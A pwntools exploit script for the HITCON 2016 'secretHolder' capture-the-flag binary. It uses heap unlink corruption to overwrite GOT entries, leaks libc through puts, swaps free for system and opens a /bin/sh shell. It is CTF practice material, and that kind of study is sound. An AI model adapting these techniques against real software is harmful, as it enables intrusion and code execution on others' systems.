import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./secretHolder_hitcon_2016')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./secretHolder_hitcon_2016')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',25937)
			elf=ELF('./secretHolder_hitcon_2016')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,b):
			io.sendlineafter('3. Renew secret','1')
			io.sendlineafter('3. Huge secret',str(a))
			io.sendafter('Tell me your secret:',b)
			
		def delete(a):
			io.sendlineafter('3. Renew secret','2')
			io.sendlineafter('3. Huge secret',str(a))

		def edit(a,c):
			io.sendlineafter('3. Renew secret','3')
			io.sendlineafter('3. Huge secret',str(a))
			io.sendafter('Tell me your secret:',c)

		add(3,'aaa')
		delete(3)
		add(1,'aaa')
		add(2,'aaa')
		delete(1)
		delete(2)
		add(3,'aaa')
		target=0x6020a8
		edit(3,p64(0)+p64(0x20)+p64(target-0x18)+p64(target-0x10)+p64(0x20)+p64(0xf0)+'\x00'*0xe8+p64(0xf1)+'\x00'*0xe8+p64(0xf1))
		delete(2)
		add(1,'aaa')
		add(2,'aaa')
		edit(3,'\x00'*0x10+p64(target-0x10)+p64(elf.got['free'])+p64(elf.got['puts']))
		edit(3,p64(elf.plt['puts']))
		delete(1)
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['puts']
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		edit(3,p64(system_addr))
		add(1,'/bin/sh\x00')
		delete(1)






		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue